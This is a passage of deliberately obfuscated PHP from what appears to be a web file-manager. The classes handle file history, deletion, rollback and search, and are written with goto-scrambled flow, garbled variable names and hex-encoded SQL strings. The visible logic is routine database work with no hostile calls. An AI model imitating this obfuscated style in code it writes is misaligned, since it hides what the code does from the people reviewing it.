$GLOBALS[$Aİ½®œˆÖª[6]][$Aİ½®œˆÖª[88]][$Aİ½®œˆÖª[1125]]; goto EğÂÇ¤²¾´; eôƒ–ÂÊöÃ: $Càí·ŒÏ²‘ = array($Aİ½®œˆÖª[410] => $Aô–ÃæÇ›); $fã†ÍŠŒ§Û = $this->field($Aİ½®œˆÖª[1950])->where($Càí·ŒÏ²‘)->order($Aİ½®œˆÖª[1944])->select(); if (!$fã†ÍŠŒ§Û || $cÔâÀÀçµÉ >= count($fã†ÍŠŒ§Û)) { return; } goto c†¦ÉšŒ¶ ; EğÂÇ¤²¾´: $cÔâÀÀçµÉ = $dšášè° == $Aİ½®œˆÖª[1148] ? 5 : $BğåÚğãæÖ; if ($BğåÚğãæÖ <= 1) { $cÔâÀÀçµÉ = 1; } if ($cÔâÀÀçµÉ >= 500) { return; } goto eôƒ–ÂÊöÃ; dˆèÕ«Ëë: $this->where($Càí·ŒÏ²‘)->delete(); Model($Aİ½®œˆÖª[450])->remove($C–¹ôä°”…); goto e›ÍÛïŒ‘’; a¬ÉœæÀŒŞ: $C–¹ôä°”… = array_slice($C–¹ôä°”…, $cÔâÀÀçµÉ); if (!$a ˜„ºŸ”Ä || !$C–¹ôä°”…) { return; } $Càí·ŒÏ²‘ = array($Aİ½®œˆÖª[412] => array($Aİ½®œˆÖª[7], $a ˜„ºŸ”Ä)); goto dˆèÕ«Ëë; e›ÍÛïŒ‘’: } public function listData($añÜË­ÎØ†) { goto d•ğ³àŒ‡Œ; AŸÇªÎçÅÒ: $C¹§“ƒØ† = $this->field($aİõ†„óÌš)->where($BÒÍèêºÓ)->order($Føµ«æŸ­è[1944])->selectPage(); $this->_listAppendUser($C¹§“ƒØ†[$Føµ«æŸ­è[367]]); $c²§†ğºÄÅ = Model($Føµ«æŸ­è[753])->get($Føµ«æŸ­è[1147]); goto FôÆéßæ„ë; FôÆéßæ„ë: $Eî¯ºÌÕ›à = 5; if ($c²§†ğºÄÅ == $Føµ«æŸ­è[1148]) { $C¹§“ƒØ†[$Føµ«æŸ­è[367]] = array_slice($C¹§“ƒØ†[$Føµ«æŸ­è[367]], 0, $Eî¯ºÌÕ›à); $C¹§“ƒØ†[$Føµ«æŸ­è[364]] = array($Føµ«æŸ­è[1952] => 1, $Føµ«æŸ­è[1953] => 20, $Føµ«æŸ­è[1954] => 1, $Føµ«æŸ­è[1955] => count($C¹§“ƒØ†[$Føµ«æŸ­è[367]])); } return $C¹§“ƒØ†; goto Cğ“ö¹åÀ„; d•ğ³àŒ‡Œ: $Føµ«æŸ­è =& $_SERVER[ä°„ä°º]; $BÒÍèêºÓ = array($Føµ«æŸ­è[410] => $añÜË­ÎØ†); $aİõ†„óÌš = $Føµ«æŸ­è[1951]; goto AŸÇªÎçÅÒ; Cğ“ö¹åÀ„: } protected function _listAppendUser(&$aéØ§ŒŒƒ£) { $BÖÁÀŒğ¹ =& $_SERVER[ä°„ä°º]; $B±ğƒŠ«± = array_to_keyvalue($aéØ§ŒŒƒ£, $BÖÁÀŒğ¹[33], $BÖÁÀŒğ¹[1551]); $fÕ…øÇê¾ë = Model($BÖÁÀŒğ¹[519])->userListInfo($B±ğƒŠ«±); foreach ($aéØ§ŒŒƒ£ as &$d„ªÑÙ£) { $bĞÑÆó• = $d„ªÑÙ£[$BÖÁÀŒğ¹[1551]]; $d„ªÑÙ£[$BÖÁÀŒğ¹[432]] = $fÕ…øÇê¾ë[$bĞÑÆó•] ? $fÕ…øÇê¾ë[$bĞÑÆó•] : !1; } unset($d„ªÑÙ£); } public function fileInfo($fÉ­îñºÒ) { $fÃÏ»®“‚Ë =& $_SERVER[ä°„ä°º]; $c³ÆŞñÉ™İ = $this->tablePrefix; $CÎÑª—íë = "{$c³ÆŞñÉ™İ}\x69\157\137\146\x69\x6c\x65\40\x66\x69\x6c\x65\x73\x20\157\x6e\40\x66\151\x6c\145\x73\56\146\151\154\x65\111\104\x20\75\x20\x68\x69\163\164\x6f\162\x79\56\146\151\x6c\x65\111\x44"; return $this->alias($fÃÏ»®“‚Ë[1956])->where(array($fÃÏ»®“‚Ë[412] => $fÉ­îñºÒ))->join($CÎÑª—íë, $fÃÏ»®“‚Ë[1957])->find(); } public function removeItem($fÒìš‡ãæÔ) { $dğäŞÎïÀ÷ =& $_SERVER[ä°„ä°º]; $Bõ³Å­†¸ = array($dğäŞÎïÀ÷[412] => $fÒìš‡ãæÔ); $FŞßì¬äè· = $this->where($Bõ³Å­†¸)->find(); if ($FŞßì¬äè·) { $C·Ì”Öñà = $this->where($Bõ³Å­†¸)->delete(); Model($dğäŞÎïÀ÷[450])->remove($FŞßì¬äè·[$dğäŞÎïÀ÷[447]]); return $C·Ì”Öñà; } return !1; } public function removeBySource($a¯šğÁ¸¢) { goto fµ”¼¸Ë£; d’šÚí¦œë: $C§îñ‘š•Ì = array($a½Š´—ÎÕÖ[410] => array($a½Š´—ÎÕÖ[7], $a¯šğÁ¸¢)); $Fùİ“Ê‡Ò = $this->field($a½Š´—ÎÕÖ[448])->where($C§îñ‘š•Ì)->select(); if ($Fùİ“Ê‡Ò) { $this->where($C§îñ‘š•Ì)->delete(); $c¨‹—ê±ê© = array_to_keyvalue($Fùİ“Ê‡Ò, $a½Š´—ÎÕÖ[33], $a½Š´—ÎÕÖ[447]); Model($a½Š´—ÎÕÖ[450])->remove($c¨‹—ê±ê©); } goto E“Àñ±­¶¬; E“Àñ±­¶¬: return !0; goto CÀ±åí İÀ; fµ”¼¸Ë£: $a½Š´—ÎÕÖ =& $_SERVER[ä°„ä°º]; if (!$a¯šğÁ¸¢) { return !1; } if (!is_array($a¯šğÁ¸¢)) { $a¯šğÁ¸¢ = array($a¯šğÁ¸¢); } goto d’šÚí¦œë; CÀ±åí İÀ: } public function setDetail($dÂ™øœÂ»•, $A‘ÂÙ¸Õ¸¨) { $Bì´×Şï =& $_SERVER[ä°„ä°º]; return $this->where(array($Bì´×Şï[412] => $dÂ™øœÂ»•))->save(array($Bì´×Şï[1947] => $A‘ÂÙ¸Õ¸¨)); } public function rollbackToItem($e®Ğäª’šß, $dÆ½¤±ˆ¥) { goto f”ÍÕÉ‡Ë; E“ƒà´äñæ: return $this->where(array($Cº„¬†éöá[412] => $dÆ½¤±ˆ¥))->delete(); goto b®Ì»‡¼‘Ú; E¶Ÿ¿¥İø: $B‡ğÂ×Ñ®‘ = $this->find($dÆ½¤±ˆ¥); $FøÁËµ¹Óİ = array($Cº„¬†éöá[447] => $B‡ğÂ×Ñ®‘[$Cº„¬†éöá[447]], $Cº„¬†éöá[78] => $B‡ğÂ×Ñ®‘[$Cº„¬†éöá[78]], $Cº„¬†éöá[84] => time(), $Cº„¬†éöá[434] => USER_ID); Model($Cº„¬†éöá[813])->where(array($Cº„¬†éöá[395] => $e®Ğäª’šß))->save($FøÁËµ¹Óİ); goto E“ƒà´äñæ; f”ÍÕÉ‡Ë: $Cº„¬†éöá =& $_SERVER[ä°„ä°º]; $B™Ää¦ÎÙŒ = Model($Cº„¬†éöá[813])->sourceInfo($e®Ğäª’šß); $this->addHistory($B™Ää¦ÎÙŒ, LNG($Cº„¬†éöá[1958])); goto E¶Ÿ¿¥İø; b®Ì»‡¼‘Ú: } public function clearSame($b¥†Ş‘ÔƒÈ) { goto AŞœ»Ö¯âó; AŞœ»Ö¯âó: $E’¨ÙÃ–ù =& $_SERVER[ä°„ä°º]; $d•™ªğ²Ô‘ = $this->listData($b¥†Ş‘ÔƒÈ); $AÖ¬“ÊÚ = array_to_keyvalue_group($d•™ªğ²Ô‘, $E’¨ÙÃ–ù[447]); goto Cê’¸êïø¸; aÀÑŠáùí: if (!$E«ÖÌíˆÖ) { return; } $this->where(array($E’¨ÙÃ–ù[393] => array($E’¨ÙÃ–ù[7], $E«ÖÌíˆÖ)))->delete(); Model($E’¨ÙÃ–ù[450])->remove($e°­¥ã«); goto CÂÍóø—É; Cê’¸êïø¸: $e°­¥ã« = array(); $E«ÖÌíˆÖ = array(); foreach ($AÖ¬“ÊÚ as $C¹í½¿”æÆ) { if (!$C¹í½¿”æÆ || count($C¹í½¿”æÆ) <= 1) { continue; } foreach ($C¹í½¿”æÆ as $EÙİ¤¬¬Œ§) { $e°­¥ã«[] = $EÙİ¤¬¬Œ§[$E’¨ÙÃ–ù[447]]; $E«ÖÌíˆÖ[] = $EÙİ¤¬¬Œ§[$E’¨ÙÃ–ù[393]]; } } goto aÀÑŠáùí; CÂÍóø—É: } public function userSpace() { $fÜ˜Äé½Ä =& $_SERVER[ä°„ä°º]; $FÜù®Ùã•ø = $this->tablePrefix; $A‡–¬É·òæ = array($fÜ˜Äé½Ä[1542] => USER_ID); $A¬Ö¿ƒç”Ü = "{$FÜù®Ùã•ø}\x69\157\137\146\x69\x6c\x65\40\x66\x69\x6c\x65\163\40\157\x6e\x20\x66\x69\x6c\145\x73\56\146\x69\x6c\x65\x49\x44\40\75\40\150\151\x73\x74\x6f\162\x79\x2e\x66\x69\154\x65\x49\104"; return $this->alias($fÜ˜Äé½Ä[1956])->where($A‡–¬É·òæ)->join($A¬Ö¿ƒç”Ü, $fÜ˜Äé½Ä[1957])->sum($fÜ˜Äé½Ä[78]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($dÛô“Ú½”Ù) { goto bÑ­‹æ…Æî; bÑ­‹æ…Æî: $E‰—È¦×Ñ =& $_SERVER[ä°„ä°º]; $F”ºÀ¡” = KodIO::fileTypeList(); $CÄ¹‘œ„äº = $F”ºÀ¡”[$dÛô“Ú½”Ù]; goto c‘„ê¸à·à; F§ÕîÎ„Ü»: if (!$CÄ¹‘œ„äº[$E‰—È¦×Ñ[168]]) { $DçŞåèè„– = array_to_keyvalue($F”ºÀ¡”, $E‰—È¦×Ñ[33], $E‰—È¦×Ñ[168]); $aïˆ¹²˜åğ = implode($E‰—È¦×Ñ[47], $DçŞåèè„–); $d¨´ô­‘Üô = $E‰—È¦×Ñ[1959]; } $A‰ëÑšñåÑ = explode($E‰—È¦×Ñ[47], trim($aïˆ¹²˜åğ, $E‰—È¦×Ñ[47])); return array($d¨´ô­‘Üô, $A‰ëÑšñåÑ); goto cÊ™ª™Ÿ‘á; c‘„ê¸à·à: if (!$CÄ¹‘œ„äº) { return array(); } $aïˆ¹²˜åğ = $CÄ¹‘œ„äº[$E‰—È¦×Ñ[168]]; $d¨´ô­‘Üô = $E‰—È¦×Ñ[7]; goto F§ÕîÎ„Ü»; cÊ™ª™Ÿ‘á: } public function listPathType($D¯Ë»¿‚¾) { $FÎìó›Ñ¥Á =& $_SERVER[ä°„ä°º]; $eÁÊĞÊŒÜ« = $this->fileTypeWhere($D¯Ë»¿‚¾); if (!$eÁÊĞÊŒÜ«) { return array(); } $BÅ­§â¨¬ = array($FÎìó›Ñ¥Á[562] => SourceModel::TYPE_USER, $FÎìó›Ñ¥Á[563] => USER_ID, $FÎìó›Ñ¥Á[559] => 0, $FÎìó›Ñ¥Á[560] => $eÁÊĞÊŒÜ«); return $this->listSource($BÅ­§â¨¬); } public function listSearch($f¾ÄïöŞ°ª, $c¨’ÛØ†ßæ = 300) { goto A¾èâ«™Ä¤; FÁ™¼Ê•È´: $this->_listMake($dˆ¦¸—Ï³±); return $dˆ¦¸—Ï³±; goto bÕöÂ¶ŸÏÒ; A¾èâ«™Ä¤: $aŒÏô÷íÓ‡ =& $_SERVER[ä°„ä°º]; if (isset($f¾ÄïöŞ°ª[$aŒÏô÷íÓ‡[1803]]) && $f¾ÄïöŞ°ª[$aŒÏô÷íÓ‡[1803]]) { $f¾ÄïöŞ°ª[$aŒÏô÷íÓ‡[1803]] = str_replace($aŒÏô÷íÓ‡[381], $aŒÏô÷íÓ‡[1960], trim($f¾ÄïöŞ°ª[$aŒÏô÷íÓ‡[1803]])); } $f„ÙÊØöæ = $this->_parseSearchWhere($f¾ÄïöŞ°ª); goto DÖö¿êŠˆõ; Fà‹†²Á‘: $this->_listSearchTag($dˆ¦¸—Ï³±, $f¾ÄïöŞ°ª, $CªñÜˆÃœå); $this->_listSearchGroupTag($dˆ¦¸—Ï³±, $f¾ÄïöŞ°ª, $CªñÜˆÃœå); $this->_listDataApply($dˆ¦¸—Ï³±[$aŒÏô÷íÓ‡[367]]); goto FÁ™¼Ê•È´; fïùÆÍÎªª: $dˆ¦¸—Ï³± = $this->distinct(!0)->field($E·¥ñ½’£)->where($f„ÙÊØöæ)->selectPage($c¨’ÛØ†ßæ); $this->_listSearchFileContent($dˆ¦¸—Ï³±, $f¾ÄïöŞ°ª, $CªñÜˆÃœå); $this->_listSearchDesc($dˆ¦¸—Ï³±, $f¾ÄïöŞ°ª, $CªñÜˆÃœå); goto Fà‹†²Á‘; DÖö¿êŠˆõ: if (!isset($f„ÙÊØöæ[$aŒÏô÷íÓ‡[423]])) { $f„ÙÊØöæ[$aŒÏô÷íÓ‡[423]] = 0; } $E·¥ñ½’£ = $aŒÏô÷íÓ‡[1961]; $CªñÜˆÃœå = $E·¥ñ½’£; goto e²³æ¢³¯”; e²³æ¢³¯”: $this->_listSearchBindPinyin($f¾ÄïöŞ°ª, $f„ÙÊØöæ, $E·¥ñ½’£); $this->alias($aŒÏô÷íÓ‡[529])->_makeOrder(); $f„ÙÊØöæ = $this->parseWhereLike($f„ÙÊØöæ); goto fïùÆÍÎªª; bÕöÂ¶ŸÏÒ: } private function _listSearchFileContent(&$DÀ² ­ÜÔ±, $A¨ÒäŠŒ·†, $CÅ–½“§ôÏ) { goto Aê®Ï½çóé; cŠ¡Áó‹µÜ: $DÀ² ­ÜÔ±[$C‡ç õŒ¹¤[367]] = array_merge($F¤ŞÖÜ­”ó, $DÀ² ­ÜÔ±[$C‡ç õŒ¹¤[367]]); $DÀ² ­ÜÔ±[$C‡ç õŒ¹¤[364]][$C‡ç õŒ¹¤[365]] += count($F¤ŞÖÜ­”ó); goto Dâƒã˜‡Ä§; BîÔ¨›ƒÎ×: if (!isset($E§Î°§ù©Ê[$C‡ç õŒ¹¤[28]]) || !is_array($A¨ÒäŠŒ·†[$C‡ç õŒ¹¤[447]])) { return; } $E§Î°§ù©Ê[$C‡ç õŒ¹¤[447]] = array($C‡ç õŒ¹¤[7], $A¨ÒäŠŒ·†[$C‡ç õŒ¹¤[447]]); unset($E§Î°§ù©Ê[$C‡ç õŒ¹¤[28]]); goto fà­àè”¯; Aê®Ï½çóé: $C‡ç õŒ¹¤ =& $_SERVER[ä°„ä°º]; if (!$A¨ÒäŠŒ·†[$C‡ç õŒ¹¤[1803]] || $DÀ² ­ÜÔ±[$C‡ç õŒ¹¤[364]][$C‡ç õŒ¹¤[351]] > 1) { return; } $E§Î°§ù©Ê = $this->_parseSearchWhere($A¨ÒäŠŒ·†); goto BîÔ¨›ƒÎ×; fà­àè”¯: unset($A¨ÒäŠŒ·†[$C‡ç õŒ¹¤[447]]); $F¤ŞÖÜ­”ó = $this->field($CÅ–½“§ôÏ)->where($E§Î°§ù©Ê)->limit($C‡ç õŒ¹¤[1962])->select(); if (!$F¤ŞÖÜ­”ó || count($F¤ŞÖÜ­”ó) == 0) { return; } goto cŠ¡Áó‹µÜ; Dâƒã˜‡Ä§: } private function _listSearchTag(&$BÔÏâ¹µÙõ, $eô˜è‚Ö²Š, $A«ø©É…œ) { goto FĞ–ñóŞ›ß; cÖó÷ç´…: if (!$CßªÔ‚Ïî·) { return; } $A·‚†Üğ·à = array($eåÃŠ„õšå[419] => array($eåÃŠ„õšå[7], $CßªÔ‚Ïî·), $eåÃŠ„õšå[1551] => USER_ID); $C™ÌÒ«´‹Ä = Model($eåÃŠ„õšå[420])->field($eåÃŠ„õšå[76])->where($A·‚†Üğ·à)->select(); goto Cæó„«é²; F†è‚ôâá: $CßªÔ‚Ïî· = array(); $CÙ¤Ğ×Ï‚ = $eô˜è‚Ö²Š[$eåÃŠ„õšå[1803]]; foreach ($e¸«¡ë™¢Û as $f²‡……‡) { $Añ†åøÈô = $f²‡……‡[$eåÃŠ„õšå[28]]; $DÉã¹Ğ¶Óó = str_replace($eåÃŠ„õšå[50], $eåÃŠ„õšå[33], Pinyin::encode($Añ†åøÈô)); if (stripos($Añ†åøÈô, $CÙ¤Ğ×Ï‚) !== !1 || stripos($DÉã¹Ğ¶Óó, $CÙ¤Ğ×Ï‚) !== !1) { $CßªÔ‚Ïî·[] = $f²‡……‡[$eåÃŠ„õšå[393]]; } } goto cÖó÷ç´…; FĞ–ñóŞ›ß: $eåÃŠ„õšå =& $_SERVER[ä°„ä°º]; if (!$eô˜è‚Ö²Š[$eåÃŠ„õšå[1803]] || $BÔÏâ¹µÙõ[$eåÃŠ„õšå[364]][$eåÃŠ„õšå[351]] > 1) { return; } $e¸«¡ë™¢Û = Model($eåÃŠ„õšå[1963])->listData(); goto F†è‚ôâá; Cæó„«é²: $C™ÌÒ«´‹Ä = array_to_keyvalue($C™ÌÒ«´‹Ä, $eåÃŠ„õšå[33], $eåÃŠ„õšå[76]); $cÌ·Ç»³Ú = array_unique($C™ÌÒ«´‹Ä); $this->_listSearchMerge($BÔÏâ¹µÙõ, $eô˜è‚Ö²Š, $A«ø©É…œ, $cÌ·Ç»³Ú); goto cóè—³„—â; cóè—³„—â: } private function _listSearchDesc(&$fçÓÀê¨·ä, $CõöÛ¤Âˆƒ, $d¹ôÀ¸ÏĞ) { goto DÅºê°Å‚ñ; DÖÌŒ¨Ïæˆ: $a·˜Í˜¼º± = Model($A¶·õÜé‚†[545])->field($A¶·õÜé‚†[395])->where($BÓ¬ÆìÃâ‚)->select(); $bÊŠ¢Ğ¬ = array_to_keyvalue($a·˜Í˜¼º±, $A¶·õÜé‚†[33], $A¶·õÜé‚†[395]); $this->_listSearchMerge($fçÓÀê¨·ä, $CõöÛ¤Âˆƒ, $d¹ôÀ¸ÏĞ, $bÊŠ¢Ğ¬); goto e¾°¼½õƒÂ; DÅºê°Å‚ñ: $A¶·õÜé‚† =& $_SERVER[ä°„ä°º]; if (!$CõöÛ¤Âˆƒ[$A¶·õÜé‚†[1803]] || $fçÓÀê¨·ä[$A¶·õÜé‚†[364]][$A¶·õÜé‚†[351]] > 1) { return; } $dÈÆèØ½ˆê = $this->listSearchChildren($CõöÛ¤Âˆƒ[$A¶·õÜé‚†[478]]); goto cŠš›ƒğñê; cŠš›ƒğñê: $dÈÆèØ½ˆê = array_unique($dÈÆèØ½ˆê); if (!$dÈÆèØ½ˆê) { return; } $BÓ¬ÆìÃâ‚ = array($A¶·õÜé‚†[395] => array($A¶·õÜé‚†[7], $dÈÆèØ½ˆê), $A¶·õÜé‚†[93] => $A¶·õÜé‚†[431], $A¶·õÜé‚†[372] => array($A¶·õÜé‚†[380], $A¶·õÜé‚†[1805] . $CõöÛ¤Âˆƒ[$A¶·õÜé‚†[1803]] . $A¶·õÜé‚†[1805])); goto DÖÌŒ¨Ïæˆ; e¾°¼½õƒÂ: } private function _listSearchGroupTag(&$DÃÙõŞ›“â, $CÉÜ¥Â¦•, $aš”µ›Ç) { goto CØñ®‰äÔ‰; EÉÇò›­Åî: $Bºøìššƒ£ = array_to_keyvalue($Bºøìššƒ£, $c÷ÁºáŸÀ¨[33], $c÷ÁºáŸÀ¨[76]); $f”¦ã°ÙÄÉ = array_unique($Bºøìššƒ£); $this->_listSearchMerge($DÃÙõŞ›“â, $CÉÜ¥Â¦•, $aš”µ›Ç, $f”¦ã°ÙÄÉ); goto AìÙƒº÷Òˆ; CØñ®‰äÔ‰: $c÷ÁºáŸÀ¨ =& $_SERVER[ä°„ä°º]; if (!$CÉÜ¥Â¦•[$c÷ÁºáŸÀ¨[1803]] || $DÃÙõŞ›“â[$c÷ÁºáŸÀ¨[364]][$c÷ÁºáŸÀ¨[351]] > 1 || !$CÉÜ¥Â¦•[$c÷ÁºáŸÀ¨[478]]) { return; } $BÌĞ®ò†„º = $this->sourceInfo($CÉÜ¥Â¦•[$c÷ÁºáŸÀ¨[478]]); goto A¦­—ÖØ„«; EÂìç¥Õ Ù: $bæÙ„Ì…© = array(); $AÉ×ÖÊ»‚ = $CÉÜ¥Â¦•[$c÷ÁºáŸÀ¨[1803]]; foreach ($D÷«˜šƒƒó[$c÷ÁºáŸÀ¨[367]] as $aà…¿öŒÑã) { $cÍÕÑîİ« = $aà…¿öŒÑã[$c÷ÁºáŸÀ¨[28]]; $B¦êİÍô İ = str_replace($c÷ÁºáŸÀ¨[50], $c÷ÁºáŸÀ¨[33], Pinyin::encode($cÍÕÑîİ«)); if (stripos($cÍÕÑîİ«, $AÉ×ÖÊ»‚) !== !1 || stripos($B¦êİÍô İ, $AÉ×ÖÊ»‚) !== !1) { $bæÙ„Ì…©[] = $aà…¿öŒÑã[$c÷ÁºáŸÀ¨[393]]; } } goto dÄ˜ÆéÌß»; dÄ˜ÆéÌß»: if (!$bæÙ„Ì…©) { return; } $EèÆÍöáÚÂ = array($c÷ÁºáŸÀ¨[419] => array($c÷ÁºáŸÀ¨[7], $bæÙ„Ì…©), $c÷ÁºáŸÀ¨[1551] => 0, $c÷ÁºáŸÀ¨[29] => $c÷ÁºáŸÀ¨[1827] . $d¦èÅ³‹–); $Bºøìššƒ£ = Model($c÷ÁºáŸÀ¨[420])->field($c÷ÁºáŸÀ¨[76])->where($EèÆÍöáÚÂ)->select(); goto EÉÇò›­Åî; A¦­—ÖØ„«: if (!$BÌĞ®ò†„º || $BÌĞ®ò†„º[$c÷ÁºáŸÀ¨[404]] != SourceModel::TYPE_GROUP) { return; } $d¦èÅ³‹– = $BÌĞ®ò†„º[$c÷ÁºáŸÀ¨[484]]; $D÷«˜šƒƒó = Model($c÷ÁºáŸÀ¨[1964])->get($d¦èÅ³‹–); goto EÂìç¥Õ Ù; AìÙƒº÷Òˆ: } private function _listSearchMerge(&$A®Ü©„«´å, $b´»æÜ˜ËÅ, $Eó¼Ñ‘Ş±Ğ, $c–¦ŒâãÅŒ) { goto EÑêÒâÉÖ¸; FÙÀ©ˆå´: $f°œë£´Ü = array_diff($c–¦ŒâãÅŒ, $CÕÚˆ·ì); if (!$f°œë£´Ü) { return; } $bïî¸©ö÷» = array($eƒ‰´æÈ…æ[395] => array($eƒ‰´æÈ…æ[7], $f°œë£´Ü)); goto e®™¯É•ã; EÑêÒâÉÖ¸: $eƒ‰´æÈ…æ =& $_SERVER[ä°„ä°º]; if (!$c–¦ŒâãÅŒ) { return; } $CÕÚˆ·ì = array_to_keyvalue($A®Ü©„«´å[$eƒ‰´æÈ…æ[367]], $eƒ‰´æÈ…æ[33], $eƒ‰´æÈ…æ[395]); goto FÙÀ©ˆå´; b‘©ù™ğŞÄ: foreach ($d¢ƒâ‹­¦´ as $a¼å³ì†õ¡) { if ($this->_listSearchFilter($a¼å³ì†õ¡, $b´»æÜ˜ËÅ)) { $bÚ…ßòôˆ½[] = $a¼å³ì†õ¡; } } $A®Ü©„«´å[$eƒ‰´æÈ…æ[367]] = array_merge($bÚ…ßòôˆ½, $A®Ü©„«´å[$eƒ‰´æÈ…æ[367]]); $A®Ü©„«´å[$eƒ‰´æÈ…æ[364]][$eƒ‰´æÈ…æ[365]] += count($bÚ…ßòôˆ½); goto F‰ó„¾†Œ¦; e®™¯É•ã: $d¢ƒâ‹­¦´ = $this->field($Eó¼Ñ‘Ş±Ğ)->where($bïî¸©ö÷»)->select(); if (!$d¢ƒâ‹­¦´) { return; } $bÚ…ßòôˆ½ = array(); goto b‘©ù™ğŞÄ; F‰ó„¾†Œ¦: } private function _listSearchFilter($DÖÕç¥±, $B¢æª¡¸‹ò) { goto a‚©™‹‹š‘; Bõ½¸ôÕ: if (isset($B¢æª¡¸‹ò[$bÛóÀ“—Ç[575]]) && $B¢æª¡¸‹ò[$bÛóÀ“—Ç[575]] != $DÖÕç¥±[$bÛóÀ“—Ç[434]]) { return !1; } return !0; goto F´ìåÕ©£Ñ; eÅËŸó¢Ù: if (isset($B¢æª¡¸‹ò[$bÛóÀ“—Ç[405]]) && $B¢æª¡¸‹ò[$bÛóÀ“—Ç[405]] != $bÛóÀ“—Ç[1770]) { if ($B¢æª¡¸‹ò[$bÛóÀ“—Ç[405]] == $bÛóÀ“—Ç[77] && !$e®‘æé÷â) { return !1; } if ($B¢æª¡¸‹ò[$bÛóÀ“—Ç[405]] != $bÛóÀ“—Ç[77] && $e®‘æé÷â) { return !1; } if (!strstr($DÖÕç¥±[$bÛóÀ“—Ç[168]], $bÛóÀ“—Ç[47] . $B¢æª¡¸‹ò[$bÛóÀ“—Ç[405]] . $bÛóÀ“—Ç[47])) { return !1; } } if (isset($B¢æª¡¸‹ò[$bÛóÀ“—Ç[1965]]) && $B¢æª¡¸‹ò[$bÛóÀ“—Ç[1965]] < $DÖÕç¥±[$bÛóÀ“—Ç[78]]) { return !1; } if (isset($B¢æª¡¸‹ò[$bÛóÀ“—Ç[1966]]) && $B¢æª¡¸‹ò[$bÛóÀ“—Ç[1966]] > $DÖÕç¥±[$bÛóÀ“—Ç[78]]) { return !1; } goto Bõ½¸ôÕ; a‚©™‹‹š‘: $bÛóÀ“—Ç =& $_SERVER[ä°„ä°º]; $e®‘æé÷â = $DÖÕç¥±[$bÛóÀ“—Ç[403]] == $bÛóÀ“—Ç[87]; if (!strstr($DÖÕç¥±[$bÛóÀ“—Ç[502]], $bÛóÀ“—Ç[47] . $B¢æª¡¸‹ò[$bÛóÀ“—Ç[478]] . $bÛóÀ“—Ç[47])) { return !1; } goto eÅËŸó¢Ù; F´ìåÕ©£Ñ: } public function listSearchChildren($eæ‡Ë‹…ç, $A’¬æ‚ŒœŒ = 5000) { goto B×ìÃá¥; dìÛÁ›ê×Â: $f¯˜í±äÏŠ = $this->field($fï®ÀéÚ[395])->where($E…àÎ¼´İÒ)->select(); $Cìñ†ƒÅ‘» = array_to_keyvalue($f¯˜í±äÏŠ, $fï®ÀéÚ[33], $fï®ÀéÚ[395]); return $Cìñ†ƒÅ‘»; goto BŸŒõÏÅÊ; Dêî›ÍÄÎ: $E…àÎ¼´İÒ = array($fï®ÀéÚ[502] => array($fï®ÀéÚ[380], $CÎ¯¦ÑÖ¦[$fï®ÀéÚ[502]] . $CÎ¯¦ÑÖ¦[$fï®ÀéÚ[395]] . $fï®ÀéÚ[526])); $BÔÀ¥¦ÕÎ¢ = $this->field($fï®ÀéÚ[395])->cache(null, 600)->where($E…àÎ¼´İÒ)->count(); if ($BÔÀ¥¦ÕÎ¢ > $A’¬æ‚ŒœŒ) { return $this->_listSearchChildrenNear($eæ‡Ë‹…ç, $A’¬æ‚ŒœŒ); } goto dìÛÁ›ê×Â; B×ìÃá¥: $fï®ÀéÚ =& $_SERVER[ä°„ä°º]; $Cìñ†ƒÅ‘» = array(); $CÎ¯¦ÑÖ¦ = $this->sourceInfo($eæ‡Ë‹…ç); goto Dêî›ÍÄÎ; BŸŒõÏÅÊ: } private function _listSearchChildrenNear($DÔ†è‚ÜƒÅ, $A‡Æİ»˜) { goto fë„ÇŞ„Ÿ§; fë„ÇŞ„Ÿ§: $fÄœ–À¨¿ =& $_SERVER[ä°„ä°º]; $AÛ®É¦¯òË = array(); $A­î¡¸†ø = array($fÄœ–À¨¿[478] => $DÔ†è‚ÜƒÅ); goto D£¨Àì³Äî; D£¨Àì³Äî: $a­¦·Öá˜î = $this->field($fÄœ–À¨¿[1967])->where($A­î¡¸†ø)->select(); $C¯¼¹‚¬²œ = array_to_keyvalue(array_filter_by_field($a­¦·Öá˜î, $fÄœ–À¨¿[403], $fÄœ–À¨¿[87]), $fÄœ–À¨¿[33], $fÄœ–À¨¿[395]); $AÛ®É¦¯òË = array_merge($AÛ®É¦¯òË, array_to_keyvalue($a­¦·Öá˜î, $fÄœ–À¨¿[33], $fÄœ–À¨¿[395])); goto Eª±áØ˜; Eª±áØ˜: if (!$C¯¼¹‚¬²œ) { return $AÛ®É¦¯òË; } $A­î¡¸†ø = array($fÄœ–À¨¿[478] => array($fÄœ–À¨¿[7], $C¯¼¹‚¬²œ)); $a­¦·Öá˜î = $this->field($fÄœ–À¨¿[1967])->where($A­î¡¸†ø)->limit($A‡Æİ»˜)->select(); goto Dî—‘æĞ‡µ; Dî—‘æĞ‡µ: $AÛ®É¦¯òË = array_merge($AÛ®É¦¯òË, array_to_keyvalue($a­¦·Öá˜î, $fÄœ–À¨¿[33], $fÄœ–À¨¿[395])); $AÛ®É¦¯òË = array_slice($AÛ®É¦¯òË, 0, $A‡Æİ»˜); return $AÛ®É¦¯òË; goto c¤ôçÔóã; c¤ôçÔóã: } private function _listSearchBindPinyin($dó™¤ÔªğŠ, &$cÃšïÍë×Õ, &$CÄ¥Ñ›«º±) { goto A´½ÖÖŸ; Ešã‰˜åÆœ: $cÃšïÍë×Õ = $eò“˜î÷Ä; goto c¥Ô©¼‰“Ş; b Ş´‘÷‘: foreach ($cÃšïÍë×Õ as $F‡îÛÖÍÁù => $Fô†‚Ú¹†ô) { $eò“˜î÷Ä[$Dê¢éÉ³‡[1969] . $F‡îÛÖÍÁù] = $Fô†‚Ú¹†ô; } foreach ($bÚªì¾ÌœÕ as $fÖò¦³÷‡) { $eò“˜î÷Ä[] = array($Dê¢éÉ³‡[1971] => $fÖò¦³÷‡, $Dê¢éÉ³‡[979] => $Dê¢éÉ³‡[1807], array($Dê¢éÉ³‡[1972] => $fÖò¦³÷‡, $Dê¢éÉ³‡[1973] => array($Dê¢éÉ³‡[7], array($Dê¢éÉ³‡[444], $Dê¢éÉ³‡[443])))); } $this->join($A®ëğ”¾šÁ); goto Ešã‰˜åÆœ; E×éù¶°ˆˆ: $CÄ¥Ñ›«º± = $Dê¢éÉ³‡[1969] . str_replace($Dê¢éÉ³‡[47], $Dê¢éÉ³‡[1970], $CÄ¥Ñ›«º±); $bÚªì¾ÌœÕ = $cÃšïÍë×Õ[$Dê¢éÉ³‡[28]]; 